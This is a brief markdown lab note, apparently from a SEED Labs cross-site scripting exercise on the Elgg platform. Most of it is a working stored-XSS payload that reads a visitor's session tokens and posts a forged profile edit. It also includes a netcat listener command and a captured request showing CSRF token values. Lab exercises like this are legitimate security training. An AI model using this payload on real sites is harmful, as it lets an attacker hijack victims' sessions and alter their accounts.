# XSS

```bash
python -m http.server 8000
```

## Malicious payload

```bash
nc -lvkn 5555
```

## Add friend then intercept request to know ID

example : GET /action/friends/add?friend=59&__elgg_ts=1640265543&__elgg_token=QMGtWpsufBBOmDje9KztjQ HTTP/1.1

## Craft response :

```html
<script type="text/javascript">
    window.onload = function(){
        var userName = "&name=" + elgg.session.user.name;
        var guid = "&guid=" + elgg.session.user.guid;
        var ts = "&__elg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        var newDescription = "description is new";
        var content = token + ts + guid + userName + "&description=" + newDescription;
        var victimGuid = "59"; // cf guid found previously
        var sendURL = "http://www.seed-server.com/action/profile/edit";

        if(elgg.session.user.guid != victimGuid){
            var Ajax = null;
            Ajax = new XMLHttpRequest();
            Ajax.open("POST",sendURL,true);
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send(content)
        }
    }

</script>
```